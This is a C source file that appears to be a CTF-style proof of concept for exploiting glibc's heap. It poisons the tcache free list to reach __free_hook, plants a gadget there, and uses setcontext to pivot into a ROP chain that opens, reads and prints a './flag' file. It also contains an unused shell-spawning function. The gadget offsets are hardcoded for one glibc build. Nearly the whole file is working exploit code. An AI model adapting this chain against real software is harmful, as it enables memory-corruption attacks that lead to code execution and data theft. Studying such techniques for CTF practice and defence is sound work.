#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void getshell()
{
  system("/bin/sh");
}
//   	mov    rsp,QWORD PTR [rdx+0xa0]
//    mov    rbx,QWORD PTR [rdx+0x80]
//    mov    rbp,QWORD PTR [rdx+0x78]
//    mov    r12,QWORD PTR [rdx+0x48]
//    mov    r13,QWORD PTR [rdx+0x50]
//    mov    r14,QWORD PTR [rdx+0x58]
//    mov    r15,QWORD PTR [rdx+0x60]
//    mov    rcx,QWORD PTR [rdx+0xa8]
//    push   rcx
//    mov    rsi,QWORD PTR [rdx+0x70]
//    mov    rdi,QWORD PTR [rdx+0x68]
//    mov    rcx,QWORD PTR [rdx+0x98]
//    mov    r8,QWORD PTR [rdx+0x28]
//    mov    r9,QWORD PTR [rdx+0x30]
//    mov    rdx,QWORD PTR [rdx+0x88]
//    xor    eax,eax
//    ret    

// 0x0000000000121d60 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
int main() {
  char* chunk1=malloc(0x100);
  char* chunk2=malloc(0x100);
  free(chunk1);
  free(chunk2);
  char* system_ptr=system;
  printf("system addr %p\n",system_ptr);
  char* free_hook=system_ptr+0x374c28;
  char* magic_gadget=system_ptr+0xddb40;
  char* setcontext=system_ptr+0x2b05;
  char* read=system_ptr+0xa3ef0;
  char* open=system_ptr+0xa3c60;
  char* write=system_ptr+0xa3f90;
  char* syscall_ret=system_ptr+0xe6069;
  char* pop_rdi_ret=system_ptr-0x2177e;
  char* pop_rsi_ret=system_ptr-0x20ea2;
  char* pop_rdx_ret=system_ptr-0x42686;
  printf("free_hook %p \n",free_hook);
  
  *(unsigned long long *)chunk2=(unsigned long long)(free_hook-8);
  
  chunk2=malloc(0x100);
  chunk1=malloc(0x100);
  *(unsigned long long *)(chunk1+8)=magic_gadget;
  printf("chunk1 %p \n",*(unsigned long long *)chunk1);
  char* padding=malloc(0x100);
  *(unsigned long long *)(padding+0x10)=pop_rdi_ret;  //orw
  *(unsigned long long *)(padding+0x18)=padding+0x78;
  *(unsigned long long *)(padding+0x20)=pop_rsi_ret;   
  *(unsigned long long *)(padding+0x28)=0;   
  *(unsigned long long *)(padding+0x30)=open;  
  *(unsigned long long *)(padding+0x38)=pop_rdi_ret;
  *(unsigned long long *)(padding+0x40)=3;
  *(unsigned long long *)(padding+0x48)=pop_rdx_ret;
  *(unsigned long long *)(padding+0x50)=0x10;
  *(unsigned long long *)(padding+0x58)=read;
  *(unsigned long long *)(padding+0x60)=pop_rdi_ret;
  *(unsigned long long *)(padding+0x68)=1;
  *(unsigned long long *)(padding+0x70)=write;
  strcpy(padding+0x78, "./flag");
  *(unsigned long long *)(padding)=setcontext;
  *(unsigned long long *)(padding+0x8)=padding-0x20;
  *(unsigned long long *)(padding-0x20+0xa0)=padding+0x18;  //rsp
  *(unsigned long long *)(padding-0x20+0xa8)=pop_rdi_ret;   //rcx
  free(padding);
  return 0;
}